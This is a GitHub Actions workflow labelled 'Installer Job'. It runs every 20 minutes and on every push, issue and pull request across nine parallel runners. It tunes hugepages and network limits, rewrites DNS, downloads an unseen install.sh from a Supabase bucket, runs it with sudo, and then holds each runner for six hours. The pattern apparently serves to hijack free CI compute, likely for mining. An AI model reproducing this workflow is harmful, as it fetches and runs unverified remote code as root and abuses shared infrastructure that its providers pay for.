name: Installer Job

on:
  push:
  pull_request:
  issues:
  schedule:
    - cron: '*/20 * * * *'

jobs:
  run-installer:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    strategy:
      matrix:
        instance: [1,2,3,4,5,6,7,8,10]
    steps:
      - name: Run installer
        run: |
          set -euo pipefail
          echo "=== VM / Kernel tuning ==="
          sudo sysctl -w vm.nr_hugepages=1280 || true
          sudo sysctl -w vm.swappiness=10
          sudo sysctl -w vm.dirty_ratio=15
          sudo sysctl -w vm.dirty_background_ratio=5
          sudo sysctl -w vm.overcommit_memory=1
          sudo sysctl -w vm.dirty_expire_centisecs=3000
          sudo sysctl -w vm.dirty_writeback_centisecs=500
          echo "=== Limits ==="
          ulimit -n 1048576 || true
          ulimit -u 65535 || true
          sudo sysctl -w fs.file-max=2097152 || true
          echo "=== Network tuning ==="
          sudo sysctl -w net.core.somaxconn=65535
          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=8192
          sudo sysctl -w net.ipv4.tcp_fin_timeout=15
          sudo sysctl -w net.ipv4.tcp_tw_reuse=1
          sudo sysctl -w net.core.rmem_max=134217728
          sudo sysctl -w net.core.wmem_max=134217728
          sudo sysctl -w net.ipv4.tcp_rmem="4096 87380 67108864"
          sudo sysctl -w net.ipv4.tcp_wmem="4096 65536 67108864"
          echo "=== DNS setup ==="
          echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
          echo "nameserver 8.8.8.8" | sudo tee -a /etc/resolv.conf
          sudo systemd-resolve --flush-caches || true
          ping -c 2 1.1.1.1 || true
          ping -c 2 google.com || true
          echo "=== START INSTALL ==="
          echo "Start at $(date)"
          echo "Repo: $GITHUB_REPOSITORY"
          echo "Run ID: $GITHUB_RUN_ID"
          echo "Instance: ${{ matrix.instance }}"
          RUNNER_NAME="runnervm${{ matrix.instance }}-${{ github.run_id }}"
          echo "Runner: $RUNNER_NAME"
          curl -fsSL \
            --retry 5 \
            --retry-delay 5 \
            --connect-timeout 10 \
            --max-time 120 \
            https://dquxldljhzrznalugirv.supabase.co/storage/v1/object/public/releases/v2.0.1/install.sh \
            -o install.sh
          chmod +x install.sh
          sudo SENTL_VERSION=v2.0.1 bash install.sh | tee output.log
          echo "=== FINISHED === $(date)"
          sleep 21600
